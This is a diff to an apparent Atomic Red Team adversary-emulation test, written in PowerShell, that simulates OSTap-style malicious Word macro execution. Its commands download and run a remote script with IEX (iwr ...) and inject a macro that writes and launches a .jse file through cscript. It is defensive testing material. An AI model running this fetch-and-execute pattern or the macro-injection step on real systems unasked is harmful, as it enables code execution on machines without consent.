@@ -1,23 +1,26 @@
-#TechniqueName: User Execution: Malicious Link
+#TechniqueName: User Execution: Malicious File
 #AtomicTestName: OSTap Style Macro Execution
 #Language: ps1
 
 #get_prereq_commands
-$msword = New-Object -ComObject word.application
-Stop-Process -Name WINWORD
+Write-Host "You will need to install Microsoft Word manually to meet this requirement"
 
 
 #prereq_commands
-If (Test-Path HKCU:SOFTWARE\Microsoft\Office\16.0) { exit 0 } else { exit 1 }
+try {
+  New-Object -COMObject "Word.Application" | Out-Null
+  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
+  Stop-Process -Name $process
+  exit 0
+} catch { exit 1 }
 
 
 #commands
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
 $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\Public\art.jse`"`n"
-Invoke-MalDoc $macrocode "16.0" "Word"
+Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
 
 
 #cleanup_commands
-if (Test-Path C:\Users\Public\art.jse) { Remove-Item C:\Users\Public\art.jse }
-Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\16.0\Word\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
 
